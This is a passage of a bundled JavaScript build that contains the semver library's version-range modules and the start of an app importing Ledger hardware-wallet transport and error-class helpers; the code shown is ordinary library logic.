    "node_modules/semver/internal/lrucache.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var LRUCache = class {
        constructor() {
          this.max = 1e3;
          this.map = /* @__PURE__ */ new Map();
        }
        get(key) {
          const value = this.map.get(key);
          if (value === void 0) {
            return void 0;
          } else {
            this.map.delete(key);
            this.map.set(key, value);
            return value;
          }
        }
        delete(key) {
          return this.map.delete(key);
        }
        set(key, value) {
          const deleted = this.delete(key);
          if (!deleted && value !== void 0) {
            if (this.map.size >= this.max) {
              const firstKey = this.map.keys().next().value;
              this.delete(firstKey);
            }
            this.map.set(key, value);
          }
          return this;
        }
      };
      module.exports = LRUCache;
    }
  });

  // node_modules/semver/classes/range.js
  var require_range = __commonJS({
    "node_modules/semver/classes/range.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SPACE_CHARACTERS = /\s+/g;
      var Range = class _Range {
        constructor(range, options) {
          options = parseOptions(options);
          if (range instanceof _Range) {
            if (range.loose === !!options.loose && range.includePrerelease === !!options.includePrerelease) {
              return range;
            } else {
              return new _Range(range.raw, options);
            }
          }
          if (range instanceof Comparator) {
            this.raw = range.value;
            this.set = [[range]];
            this.formatted = void 0;
            return this;
          }
          this.options = options;
          this.loose = !!options.loose;
          this.includePrerelease = !!options.includePrerelease;
          this.raw = range.trim().replace(SPACE_CHARACTERS, " ");
          this.set = this.raw.split("||").map((r) => this.parseRange(r.trim())).filter((c) => c.length);
          if (!this.set.length) {
            throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
          }
          if (this.set.length > 1) {
            const first = this.set[0];
            this.set = this.set.filter((c) => !isNullSet(c[0]));
            if (this.set.length === 0) {
              this.set = [first];
            } else if (this.set.length > 1) {
              for (const c of this.set) {
                if (c.length === 1 && isAny(c[0])) {
                  this.set = [c];
                  break;
                }
              }
            }
          }
          this.formatted = void 0;
        }
        get range() {
          if (this.formatted === void 0) {
            this.formatted = "";
            for (let i = 0; i < this.set.length; i++) {
              if (i > 0) {
                this.formatted += "||";
              }
              const comps = this.set[i];
              for (let k = 0; k < comps.length; k++) {
                if (k > 0) {
                  this.formatted += " ";
                }
                this.formatted += comps[k].toString().trim();
              }
            }
          }
          return this.formatted;
        }
        format() {
          return this.range;
        }
        toString() {
          return this.range;
        }
        parseRange(range) {
          const memoOpts = (this.options.includePrerelease && FLAG_INCLUDE_PRERELEASE) | (this.options.loose && FLAG_LOOSE);
          const memoKey = memoOpts + ":" + range;
          const cached = cache.get(memoKey);
          if (cached) {
            return cached;
          }
          const loose = this.options.loose;
          const hr = loose ? re[t.HYPHENRANGELOOSE] : re[t.HYPHENRANGE];
          range = range.replace(hr, hyphenReplace(this.options.includePrerelease));
          debug("hyphen replace", range);
          range = range.replace(re[t.COMPARATORTRIM], comparatorTrimReplace);
          debug("comparator trim", range);
          range = range.replace(re[t.TILDETRIM], tildeTrimReplace);
          debug("tilde trim", range);
          range = range.replace(re[t.CARETTRIM], caretTrimReplace);
          debug("caret trim", range);
          let rangeList = range.split(" ").map((comp) => parseComparator(comp, this.options)).join(" ").split(/\s+/).map((comp) => replaceGTE0(comp, this.options));
          if (loose) {
            rangeList = rangeList.filter((comp) => {
              debug("loose invalid filter", comp, this.options);
              return !!comp.match(re[t.COMPARATORLOOSE]);
            });
          }
          debug("range list", rangeList);
          const rangeMap = /* @__PURE__ */ new Map();
          const comparators = rangeList.map((comp) => new Comparator(comp, this.options));
          for (const comp of comparators) {
            if (isNullSet(comp)) {
              return [comp];
            }
            rangeMap.set(comp.value, comp);
          }
          if (rangeMap.size > 1 && rangeMap.has("")) {
            rangeMap.delete("");
          }
          const result = [...rangeMap.values()];
          cache.set(memoKey, result);
          return result;
        }
        intersects(range, options) {
          if (!(range instanceof _Range)) {
            throw new TypeError("a Range is required");
          }
          return this.set.some((thisComparators) => {
            return isSatisfiable(thisComparators, options) && range.set.some((rangeComparators) => {
              return isSatisfiable(rangeComparators, options) && thisComparators.every((thisComparator) => {
                return rangeComparators.every((rangeComparator) => {
                  return thisComparator.intersects(rangeComparator, options);
                });
              });
            });
          });
        }
        // if ANY of the sets match ALL of its comparators, then pass
        test(version) {
          if (!version) {
            return false;
          }
          if (typeof version === "string") {
            try {
              version = new SemVer(version, this.options);
            } catch (er) {
              return false;
            }
          }
          for (let i = 0; i < this.set.length; i++) {
            if (testSet(this.set[i], version, this.options)) {
              return true;
            }
          }
          return false;
        }
      };
      module.exports = Range;
      var LRU = require_lrucache();
      var cache = new LRU();
      var parseOptions = require_parse_options();
      var Comparator = require_comparator();
      var debug = require_debug();
      var SemVer = require_semver();
      var {
        safeRe: re,
        t,
        comparatorTrimReplace,
        tildeTrimReplace,
        caretTrimReplace
      } = require_re();
      var { FLAG_INCLUDE_PRERELEASE, FLAG_LOOSE } = require_constants();
      var isNullSet = (c) => c.value === "<0.0.0-0";
      var isAny = (c) => c.value === "";
      var isSatisfiable = (comparators, options) => {
        let result = true;
        const remainingComparators = comparators.slice();
        let testComparator = remainingComparators.pop();
        while (result && remainingComparators.length) {
          result = remainingComparators.every((otherComparator) => {
            return testComparator.intersects(otherComparator, options);
          });
          testComparator = remainingComparators.pop();
        }
        return result;
      };
      var parseComparator = (comp, options) => {
        comp = comp.replace(re[t.BUILD], "");
        debug("comp", comp, options);
        comp = replaceCarets(comp, options);
        debug("caret", comp);
        comp = replaceTildes(comp, options);
        debug("tildes", comp);
        comp = replaceXRanges(comp, options);
        debug("xrange", comp);
        comp = replaceStars(comp, options);
        debug("stars", comp);
        return comp;
      };
      var isX = (id2) => !id2 || id2.toLowerCase() === "x" || id2 === "*";
      var replaceTildes = (comp, options) => {
        return comp.trim().split(/\s+/).map((c) => replaceTilde(c, options)).join(" ");
      };
      var replaceTilde = (comp, options) => {
        const r = options.loose ? re[t.TILDELOOSE] : re[t.TILDE];
        return comp.replace(r, (_, M, m, p, pr) => {
          debug("tilde", comp, _, M, m, p, pr);
          let ret;
          if (isX(M)) {
            ret = "";
          } else if (isX(m)) {
            ret = `>=${M}.0.0 <${+M + 1}.0.0-0`;
          } else if (isX(p)) {
            ret = `>=${M}.${m}.0 <${M}.${+m + 1}.0-0`;
          } else if (pr) {
            debug("replaceTilde pr", pr);
            ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
          } else {
            ret = `>=${M}.${m}.${p} <${M}.${+m + 1}.0-0`;
          }
          debug("tilde return", ret);
          return ret;
        });
      };
      var replaceCarets = (comp, options) => {
        return comp.trim().split(/\s+/).map((c) => replaceCaret(c, options)).join(" ");
      };
      var replaceCaret = (comp, options) => {
        debug("caret", comp, options);
        const r = options.loose ? re[t.CARETLOOSE] : re[t.CARET];
        const z = options.includePrerelease ? "-0" : "";
        return comp.replace(r, (_, M, m, p, pr) => {
          debug("caret", comp, _, M, m, p, pr);
          let ret;
          if (isX(M)) {
            ret = "";
          } else if (isX(m)) {
            ret = `>=${M}.0.0${z} <${+M + 1}.0.0-0`;
          } else if (isX(p)) {
            if (M === "0") {
              ret = `>=${M}.${m}.0${z} <${M}.${+m + 1}.0-0`;
            } else {
              ret = `>=${M}.${m}.0${z} <${+M + 1}.0.0-0`;
            }
          } else if (pr) {
            debug("replaceCaret pr", pr);
            if (M === "0") {
              if (m === "0") {
                ret = `>=${M}.${m}.${p}-${pr} <${M}.${m}.${+p + 1}-0`;
              } else {
                ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
              }
            } else {
              ret = `>=${M}.${m}.${p}-${pr} <${+M + 1}.0.0-0`;
            }
          } else {
            debug("no pr");
            if (M === "0") {
              if (m === "0") {
                ret = `>=${M}.${m}.${p}${z} <${M}.${m}.${+p + 1}-0`;
              } else {
                ret = `>=${M}.${m}.${p}${z} <${M}.${+m + 1}.0-0`;
              }
            } else {
              ret = `>=${M}.${m}.${p} <${+M + 1}.0.0-0`;
            }
          }
          debug("caret return", ret);
          return ret;
        });
      };
      var replaceXRanges = (comp, options) => {
        debug("replaceXRanges", comp, options);
        return comp.split(/\s+/).map((c) => replaceXRange(c, options)).join(" ");
      };
      var replaceXRange = (comp, options) => {
        comp = comp.trim();
        const r = options.loose ? re[t.XRANGELOOSE] : re[t.XRANGE];
        return comp.replace(r, (ret, gtlt, M, m, p, pr) => {
          debug("xRange", comp, ret, gtlt, M, m, p, pr);
          const xM = isX(M);
          const xm = xM || isX(m);
          const xp = xm || isX(p);
          const anyX = xp;
          if (gtlt === "=" && anyX) {
            gtlt = "";
          }
          pr = options.includePrerelease ? "-0" : "";
          if (xM) {
            if (gtlt === ">" || gtlt === "<") {
              ret = "<0.0.0-0";
            } else {
              ret = "*";
            }
          } else if (gtlt && anyX) {
            if (xm) {
              m = 0;
            }
            p = 0;
            if (gtlt === ">") {
              gtlt = ">=";
              if (xm) {
                M = +M + 1;
                m = 0;
                p = 0;
              } else {
                m = +m + 1;
                p = 0;
              }
            } else if (gtlt === "<=") {
              gtlt = "<";
              if (xm) {
                M = +M + 1;
              } else {
                m = +m + 1;
              }
            }
            if (gtlt === "<") {
              pr = "-0";
            }
            ret = `${gtlt + M}.${m}.${p}${pr}`;
          } else if (xm) {
            ret = `>=${M}.0.0${pr} <${+M + 1}.0.0-0`;
          } else if (xp) {
            ret = `>=${M}.${m}.0${pr} <${M}.${+m + 1}.0-0`;
          }
          debug("xRange return", ret);
          return ret;
        });
      };
      var replaceStars = (comp, options) => {
        debug("replaceStars", comp, options);
        return comp.trim().replace(re[t.STAR], "");
      };
      var replaceGTE0 = (comp, options) => {
        debug("replaceGTE0", comp, options);
        return comp.trim().replace(re[options.includePrerelease ? t.GTE0PRE : t.GTE0], "");
      };
      var hyphenReplace = (incPr) => ($0, from, fM, fm, fp, fpr, fb, to, tM, tm, tp, tpr) => {
        if (isX(fM)) {
          from = "";
        } else if (isX(fm)) {
          from = `>=${fM}.0.0${incPr ? "-0" : ""}`;
        } else if (isX(fp)) {
          from = `>=${fM}.${fm}.0${incPr ? "-0" : ""}`;
        } else if (fpr) {
          from = `>=${from}`;
        } else {
          from = `>=${from}${incPr ? "-0" : ""}`;
        }
        if (isX(tM)) {
          to = "";
        } else if (isX(tm)) {
          to = `<${+tM + 1}.0.0-0`;
        } else if (isX(tp)) {
          to = `<${tM}.${+tm + 1}.0-0`;
        } else if (tpr) {
          to = `<=${tM}.${tm}.${tp}-${tpr}`;
        } else if (incPr) {
          to = `<${tM}.${tm}.${+tp + 1}-0`;
        } else {
          to = `<=${to}`;
        }
        return `${from} ${to}`.trim();
      };
      var testSet = (set, version, options) => {
        for (let i = 0; i < set.length; i++) {
          if (!set[i].test(version)) {
            return false;
          }
        }
        if (version.prerelease.length && !options.includePrerelease) {
          for (let i = 0; i < set.length; i++) {
            debug(set[i].semver);
            if (set[i].semver === Comparator.ANY) {
              continue;
            }
            if (set[i].semver.prerelease.length > 0) {
              const allowed = set[i].semver;
              if (allowed.major === version.major && allowed.minor === version.minor && allowed.patch === version.patch) {
                return true;
              }
            }
          }
          return false;
        }
        return true;
      };
    }
  });

  // node_modules/semver/classes/comparator.js
  var require_comparator = __commonJS({
    "node_modules/semver/classes/comparator.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var ANY = /* @__PURE__ */ Symbol("SemVer ANY");
      var Comparator = class _Comparator {
        static get ANY() {
          return ANY;
        }
        constructor(comp, options) {
          options = parseOptions(options);
          if (comp instanceof _Comparator) {
            if (comp.loose === !!options.loose) {
              return comp;
            } else {
              comp = comp.value;
            }
          }
          comp = comp.trim().split(/\s+/).join(" ");
          debug("comparator", comp, options);
          this.options = options;
          this.loose = !!options.loose;
          this.parse(comp);
          if (this.semver === ANY) {
            this.value = "";
          } else {
            this.value = this.operator + this.semver.version;
          }
          debug("comp", this);
        }
        parse(comp) {
          const r = this.options.loose ? re[t.COMPARATORLOOSE] : re[t.COMPARATOR];
          const m = comp.match(r);
          if (!m) {
            throw new TypeError(`Invalid comparator: ${comp}`);
          }
          this.operator = m[1] !== void 0 ? m[1] : "";
          if (this.operator === "=") {
            this.operator = "";
          }
          if (!m[2]) {
            this.semver = ANY;
          } else {
            this.semver = new SemVer(m[2], this.options.loose);
          }
        }
        toString() {
          return this.value;
        }
        test(version) {
          debug("Comparator.test", version, this.options.loose);
          if (this.semver === ANY || version === ANY) {
            return true;
          }
          if (typeof version === "string") {
            try {
              version = new SemVer(version, this.options);
            } catch (er) {
              return false;
            }
          }
          return cmp(version, this.operator, this.semver, this.options);
        }
        intersects(comp, options) {
          if (!(comp instanceof _Comparator)) {
            throw new TypeError("a Comparator is required");
          }
          if (this.operator === "") {
            if (this.value === "") {
              return true;
            }
            return new Range(comp.value, options).test(this.value);
          } else if (comp.operator === "") {
            if (comp.value === "") {
              return true;
            }
            return new Range(this.value, options).test(comp.semver);
          }
          options = parseOptions(options);
          if (options.includePrerelease && (this.value === "<0.0.0-0" || comp.value === "<0.0.0-0")) {
            return false;
          }
          if (!options.includePrerelease && (this.value.startsWith("<0.0.0") || comp.value.startsWith("<0.0.0"))) {
            return false;
          }
          if (this.operator.startsWith(">") && comp.operator.startsWith(">")) {
            return true;
          }
          if (this.operator.startsWith("<") && comp.operator.startsWith("<")) {
            return true;
          }
          if (this.semver.version === comp.semver.version && this.operator.includes("=") && comp.operator.includes("=")) {
            return true;
          }
          if (cmp(this.semver, "<", comp.semver, options) && this.operator.startsWith(">") && comp.operator.startsWith("<")) {
            return true;
          }
          if (cmp(this.semver, ">", comp.semver, options) && this.operator.startsWith("<") && comp.operator.startsWith(">")) {
            return true;
          }
          return false;
        }
      };
      module.exports = Comparator;
      var parseOptions = require_parse_options();
      var { safeRe: re, t } = require_re();
      var cmp = require_cmp();
      var debug = require_debug();
      var SemVer = require_semver();
      var Range = require_range();
    }
  });

  // node_modules/semver/functions/satisfies.js
  var require_satisfies = __commonJS({
    "node_modules/semver/functions/satisfies.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var Range = require_range();
      var satisfies = (version, range, options) => {
        try {
          range = new Range(range, options);
        } catch (er) {
          return false;
        }
        return range.test(version);
      };
      module.exports = satisfies;
    }
  });

  // node_modules/semver/ranges/to-comparators.js
  var require_to_comparators = __commonJS({
    "node_modules/semver/ranges/to-comparators.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var Range = require_range();
      var toComparators = (range, options) => new Range(range, options).set.map((comp) => comp.map((c) => c.value).join(" ").trim().split(" "));
      module.exports = toComparators;
    }
  });

  // node_modules/semver/ranges/max-satisfying.js
  var require_max_satisfying = __commonJS({
    "node_modules/semver/ranges/max-satisfying.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var Range = require_range();
      var maxSatisfying = (versions, range, options) => {
        let max = null;
        let maxSV = null;
        let rangeObj = null;
        try {
          rangeObj = new Range(range, options);
        } catch (er) {
          return null;
        }
        versions.forEach((v) => {
          if (rangeObj.test(v)) {
            if (!max || maxSV.compare(v) === -1) {
              max = v;
              maxSV = new SemVer(max, options);
            }
          }
        });
        return max;
      };
      module.exports = maxSatisfying;
    }
  });

  // node_modules/semver/ranges/min-satisfying.js
  var require_min_satisfying = __commonJS({
    "node_modules/semver/ranges/min-satisfying.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var Range = require_range();
      var minSatisfying = (versions, range, options) => {
        let min = null;
        let minSV = null;
        let rangeObj = null;
        try {
          rangeObj = new Range(range, options);
        } catch (er) {
          return null;
        }
        versions.forEach((v) => {
          if (rangeObj.test(v)) {
            if (!min || minSV.compare(v) === 1) {
              min = v;
              minSV = new SemVer(min, options);
            }
          }
        });
        return min;
      };
      module.exports = minSatisfying;
    }
  });

  // node_modules/semver/ranges/min-version.js
  var require_min_version = __commonJS({
    "node_modules/semver/ranges/min-version.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var Range = require_range();
      var gt = require_gt();
      var minVersion = (range, loose) => {
        range = new Range(range, loose);
        let minver = new SemVer("0.0.0");
        if (range.test(minver)) {
          return minver;
        }
        minver = new SemVer("0.0.0-0");
        if (range.test(minver)) {
          return minver;
        }
        minver = null;
        for (let i = 0; i < range.set.length; ++i) {
          const comparators = range.set[i];
          let setMin = null;
          comparators.forEach((comparator) => {
            const compver = new SemVer(comparator.semver.version);
            switch (comparator.operator) {
              case ">":
                if (compver.prerelease.length === 0) {
                  compver.patch++;
                } else {
                  compver.prerelease.push(0);
                }
                compver.raw = compver.format();
              /* fallthrough */
              case "":
              case ">=":
                if (!setMin || gt(compver, setMin)) {
                  setMin = compver;
                }
                break;
              case "<":
              case "<=":
                break;
              /* istanbul ignore next */
              default:
                throw new Error(`Unexpected operation: ${comparator.operator}`);
            }
          });
          if (setMin && (!minver || gt(minver, setMin))) {
            minver = setMin;
          }
        }
        if (minver && range.test(minver)) {
          return minver;
        }
        return null;
      };
      module.exports = minVersion;
    }
  });

  // node_modules/semver/ranges/valid.js
  var require_valid2 = __commonJS({
    "node_modules/semver/ranges/valid.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var Range = require_range();
      var validRange = (range, options) => {
        try {
          return new Range(range, options).range || "*";
        } catch (er) {
          return null;
        }
      };
      module.exports = validRange;
    }
  });

  // node_modules/semver/ranges/outside.js
  var require_outside = __commonJS({
    "node_modules/semver/ranges/outside.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var Comparator = require_comparator();
      var { ANY } = Comparator;
      var Range = require_range();
      var satisfies = require_satisfies();
      var gt = require_gt();
      var lt = require_lt();
      var lte = require_lte();
      var gte = require_gte();
      var outside = (version, range, hilo, options) => {
        version = new SemVer(version, options);
        range = new Range(range, options);
        let gtfn, ltefn, ltfn, comp, ecomp;
        switch (hilo) {
          case ">":
            gtfn = gt;
            ltefn = lte;
            ltfn = lt;
            comp = ">";
            ecomp = ">=";
            break;
          case "<":
            gtfn = lt;
            ltefn = gte;
            ltfn = gt;
            comp = "<";
            ecomp = "<=";
            break;
          default:
            throw new TypeError('Must provide a hilo val of "<" or ">"');
        }
        if (satisfies(version, range, options)) {
          return false;
        }
        for (let i = 0; i < range.set.length; ++i) {
          const comparators = range.set[i];
          let high = null;
          let low = null;
          comparators.forEach((comparator) => {
            if (comparator.semver === ANY) {
              comparator = new Comparator(">=0.0.0");
            }
            high = high || comparator;
            low = low || comparator;
            if (gtfn(comparator.semver, high.semver, options)) {
              high = comparator;
            } else if (ltfn(comparator.semver, low.semver, options)) {
              low = comparator;
            }
          });
          if (high.operator === comp || high.operator === ecomp) {
            return false;
          }
          if ((!low.operator || low.operator === comp) && ltefn(version, low.semver)) {
            return false;
          } else if (low.operator === ecomp && ltfn(version, low.semver)) {
            return false;
          }
        }
        return true;
      };
      module.exports = outside;
    }
  });

  // node_modules/semver/ranges/gtr.js
  var require_gtr = __commonJS({
    "node_modules/semver/ranges/gtr.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var outside = require_outside();
      var gtr = (version, range, options) => outside(version, range, ">", options);
      module.exports = gtr;
    }
  });

  // node_modules/semver/ranges/ltr.js
  var require_ltr = __commonJS({
    "node_modules/semver/ranges/ltr.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var outside = require_outside();
      var ltr = (version, range, options) => outside(version, range, "<", options);
      module.exports = ltr;
    }
  });

  // node_modules/semver/ranges/intersects.js
  var require_intersects = __commonJS({
    "node_modules/semver/ranges/intersects.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var Range = require_range();
      var intersects = (r1, r2, options) => {
        r1 = new Range(r1, options);
        r2 = new Range(r2, options);
        return r1.intersects(r2, options);
      };
      module.exports = intersects;
    }
  });

  // node_modules/semver/ranges/simplify.js
  var require_simplify = __commonJS({
    "node_modules/semver/ranges/simplify.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var satisfies = require_satisfies();
      var compare = require_compare();
      module.exports = (versions, range, options) => {
        const set = [];
        let first = null;
        let prev = null;
        const v = versions.sort((a, b) => compare(a, b, options));
        for (const version of v) {
          const included = satisfies(version, range, options);
          if (included) {
            prev = version;
            if (!first) {
              first = version;
            }
          } else {
            if (prev) {
              set.push([first, prev]);
            }
            prev = null;
            first = null;
          }
        }
        if (first) {
          set.push([first, null]);
        }
        const ranges = [];
        for (const [min, max] of set) {
          if (min === max) {
            ranges.push(min);
          } else if (!max && min === v[0]) {
            ranges.push("*");
          } else if (!max) {
            ranges.push(`>=${min}`);
          } else if (min === v[0]) {
            ranges.push(`<=${max}`);
          } else {
            ranges.push(`${min} - ${max}`);
          }
        }
        const simplified = ranges.join(" || ");
        const original = typeof range.raw === "string" ? range.raw : String(range);
        return simplified.length < original.length ? simplified : range;
      };
    }
  });

  // node_modules/semver/ranges/subset.js
  var require_subset = __commonJS({
    "node_modules/semver/ranges/subset.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var Range = require_range();
      var Comparator = require_comparator();
      var { ANY } = Comparator;
      var satisfies = require_satisfies();
      var compare = require_compare();
      var subset = (sub, dom, options = {}) => {
        if (sub === dom) {
          return true;
        }
        sub = new Range(sub, options);
        dom = new Range(dom, options);
        let sawNonNull = false;
        OUTER: for (const simpleSub of sub.set) {
          for (const simpleDom of dom.set) {
            const isSub = simpleSubset(simpleSub, simpleDom, options);
            sawNonNull = sawNonNull || isSub !== null;
            if (isSub) {
              continue OUTER;
            }
          }
          if (sawNonNull) {
            return false;
          }
        }
        return true;
      };
      var minimumVersionWithPreRelease = [new Comparator(">=0.0.0-0")];
      var minimumVersion = [new Comparator(">=0.0.0")];
      var simpleSubset = (sub, dom, options) => {
        if (sub === dom) {
          return true;
        }
        if (sub.length === 1 && sub[0].semver === ANY) {
          if (dom.length === 1 && dom[0].semver === ANY) {
            return true;
          } else if (options.includePrerelease) {
            sub = minimumVersionWithPreRelease;
          } else {
            sub = minimumVersion;
          }
        }
        if (dom.length === 1 && dom[0].semver === ANY) {
          if (options.includePrerelease) {
            return true;
          } else {
            dom = minimumVersion;
          }
        }
        const eqSet = /* @__PURE__ */ new Set();
        let gt, lt;
        for (const c of sub) {
          if (c.operator === ">" || c.operator === ">=") {
            gt = higherGT(gt, c, options);
          } else if (c.operator === "<" || c.operator === "<=") {
            lt = lowerLT(lt, c, options);
          } else {
            eqSet.add(c.semver);
          }
        }
        if (eqSet.size > 1) {
          return null;
        }
        let gtltComp;
        if (gt && lt) {
          gtltComp = compare(gt.semver, lt.semver, options);
          if (gtltComp > 0) {
            return null;
          } else if (gtltComp === 0 && (gt.operator !== ">=" || lt.operator !== "<=")) {
            return null;
          }
        }
        for (const eq of eqSet) {
          if (gt && !satisfies(eq, String(gt), options)) {
            return null;
          }
          if (lt && !satisfies(eq, String(lt), options)) {
            return null;
          }
          for (const c of dom) {
            if (!satisfies(eq, String(c), options)) {
              return false;
            }
          }
          return true;
        }
        let higher, lower;
        let hasDomLT, hasDomGT;
        let needDomLTPre = lt && !options.includePrerelease && lt.semver.prerelease.length ? lt.semver : false;
        let needDomGTPre = gt && !options.includePrerelease && gt.semver.prerelease.length ? gt.semver : false;
        if (needDomLTPre && needDomLTPre.prerelease.length === 1 && lt.operator === "<" && needDomLTPre.prerelease[0] === 0) {
          needDomLTPre = false;
        }
        for (const c of dom) {
          hasDomGT = hasDomGT || c.operator === ">" || c.operator === ">=";
          hasDomLT = hasDomLT || c.operator === "<" || c.operator === "<=";
          if (gt) {
            if (needDomGTPre) {
              if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomGTPre.major && c.semver.minor === needDomGTPre.minor && c.semver.patch === needDomGTPre.patch) {
                needDomGTPre = false;
              }
            }
            if (c.operator === ">" || c.operator === ">=") {
              higher = higherGT(gt, c, options);
              if (higher === c && higher !== gt) {
                return false;
              }
            } else if (gt.operator === ">=" && !satisfies(gt.semver, String(c), options)) {
              return false;
            }
          }
          if (lt) {
            if (needDomLTPre) {
              if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomLTPre.major && c.semver.minor === needDomLTPre.minor && c.semver.patch === needDomLTPre.patch) {
                needDomLTPre = false;
              }
            }
            if (c.operator === "<" || c.operator === "<=") {
              lower = lowerLT(lt, c, options);
              if (lower === c && lower !== lt) {
                return false;
              }
            } else if (lt.operator === "<=" && !satisfies(lt.semver, String(c), options)) {
              return false;
            }
          }
          if (!c.operator && (lt || gt) && gtltComp !== 0) {
            return false;
          }
        }
        if (gt && hasDomLT && !lt && gtltComp !== 0) {
          return false;
        }
        if (lt && hasDomGT && !gt && gtltComp !== 0) {
          return false;
        }
        if (needDomGTPre || needDomLTPre) {
          return false;
        }
        return true;
      };
      var higherGT = (a, b, options) => {
        if (!a) {
          return b;
        }
        const comp = compare(a.semver, b.semver, options);
        return comp > 0 ? a : comp < 0 ? b : b.operator === ">" && a.operator === ">=" ? b : a;
      };
      var lowerLT = (a, b, options) => {
        if (!a) {
          return b;
        }
        const comp = compare(a.semver, b.semver, options);
        return comp < 0 ? a : comp > 0 ? b : b.operator === "<" && a.operator === "<=" ? b : a;
      };
      module.exports = subset;
    }
  });

  // node_modules/semver/index.js
  var require_semver2 = __commonJS({
    "node_modules/semver/index.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var internalRe = require_re();
      var constants = require_constants();
      var SemVer = require_semver();
      var identifiers = require_identifiers();
      var parse = require_parse();
      var valid = require_valid();
      var clean = require_clean();
      var inc = require_inc();
      var diff = require_diff();
      var major = require_major();
      var minor = require_minor();
      var patch = require_patch();
      var prerelease = require_prerelease();
      var compare = require_compare();
      var rcompare = require_rcompare();
      var compareLoose = require_compare_loose();
      var compareBuild = require_compare_build();
      var sort = require_sort();
      var rsort = require_rsort();
      var gt = require_gt();
      var lt = require_lt();
      var eq = require_eq();
      var neq = require_neq();
      var gte = require_gte();
      var lte = require_lte();
      var cmp = require_cmp();
      var coerce = require_coerce();
      var Comparator = require_comparator();
      var Range = require_range();
      var satisfies = require_satisfies();
      var toComparators = require_to_comparators();
      var maxSatisfying = require_max_satisfying();
      var minSatisfying = require_min_satisfying();
      var minVersion = require_min_version();
      var validRange = require_valid2();
      var outside = require_outside();
      var gtr = require_gtr();
      var ltr = require_ltr();
      var intersects = require_intersects();
      var simplifyRange = require_simplify();
      var subset = require_subset();
      module.exports = {
        parse,
        valid,
        clean,
        inc,
        diff,
        major,
        minor,
        patch,
        prerelease,
        compare,
        rcompare,
        compareLoose,
        compareBuild,
        sort,
        rsort,
        gt,
        lt,
        eq,
        neq,
        gte,
        lte,
        cmp,
        coerce,
        Comparator,
        Range,
        satisfies,
        toComparators,
        maxSatisfying,
        minSatisfying,
        minVersion,
        validRange,
        outside,
        gtr,
        ltr,
        intersects,
        simplifyRange,
        subset,
        SemVer,
        re: internalRe.re,
        src: internalRe.src,
        tokens: internalRe.t,
        SEMVER_SPEC_VERSION: constants.SEMVER_SPEC_VERSION,
        RELEASE_TYPES: constants.RELEASE_TYPES,
        compareIdentifiers: identifiers.compareIdentifiers,
        rcompareIdentifiers: identifiers.rcompareIdentifiers
      };
    }
  });

  // app.js
  init_buffer_shim();
  var import_buffer2 = __toESM(require_buffer(), 1);

  // node_modules/@ledgerhq/hw-transport-webhid/lib-es/TransportWebHID.js
  init_buffer_shim();

  // node_modules/@ledgerhq/hw-transport-webhid/node_modules/@ledgerhq/hw-transport/lib-es/Transport.js
  init_buffer_shim();
  var import_events = __toESM(require_events());

  // node_modules/@ledgerhq/errors/lib-es/index.js
  init_buffer_shim();

  // node_modules/@ledgerhq/errors/lib-es/helpers.js
  init_buffer_shim();
  var errorClasses = {};
  var deserializers = {};
  var addCustomErrorDeserializer = (name, deserializer) => {
    deserializers[name] = deserializer;
  };
  var createCustomErrorClass = (name) => {
    class CustomErrorClass extends Error {
      cause;
      constructor(message, fields, options) {
        super(message || name, options);
        Object.setPrototypeOf(this, CustomErrorClass.prototype);
        this.name = name;
        if (fields) {
          for (const k in fields) {
            this[k] = fields[k];
          }
        }
        if (options && isObject(options) && "cause" in options && !this.cause) {
          const cause = options.cause;
          this.cause = cause;
          if ("stack" in cause) {
            this.stack = this.stack + "\nCAUSE: " + cause.stack;
          }
        }
      }
    }
    errorClasses[name] = CustomErrorClass;
    return CustomErrorClass;
  };
  function isObject(value) {
    return typeof value === "object";
  }

  // node_modules/@ledgerhq/errors/lib-es/index.js
  var AccountNameRequiredError = createCustomErrorClass("AccountNameRequired");
  var AccountNotSupported = createCustomErrorClass("AccountNotSupported");
  var AccountAwaitingSendPendingOperations = createCustomErrorClass("AccountAwaitingSendPendingOperations");
  var AmountRequired = createCustomErrorClass("AmountRequired");
  var BluetoothRequired = createCustomErrorClass("BluetoothRequired");
  var BtcUnmatchedApp = createCustomErrorClass("BtcUnmatchedApp");
  var CantOpenDevice = createCustomErrorClass("CantOpenDevice");
  var CashAddrNotSupported = createCustomErrorClass("CashAddrNotSupported");
  var ClaimRewardsFeesWarning = createCustomErrorClass("ClaimRewardsFeesWarning");
  var CurrencyNotSupported = createCustomErrorClass("CurrencyNotSupported");
  var DeviceAppVerifyNotSupported = createCustomErrorClass("DeviceAppVerifyNotSupported");
  var DeviceGenuineSocketEarlyClose = createCustomErrorClass("DeviceGenuineSocketEarlyClose");
  var DeviceNotGenuineError = createCustomErrorClass("DeviceNotGenuine");
  var DeviceOnDashboardExpected = createCustomErrorClass("DeviceOnDashboardExpected");
  var DeviceOnDashboardUnexpected = createCustomErrorClass("DeviceOnDashboardUnexpected");
  var DeviceInOSUExpected = createCustomErrorClass("DeviceInOSUExpected");
  var DeviceHalted = createCustomErrorClass("DeviceHalted");
  var DeviceNameInvalid = createCustomErrorClass("DeviceNameInvalid");
  var DeviceSocketFail = createCustomErrorClass("DeviceSocketFail");
  var DeviceSocketNoBulkStatus = createCustomErrorClass("DeviceSocketNoBulkStatus");
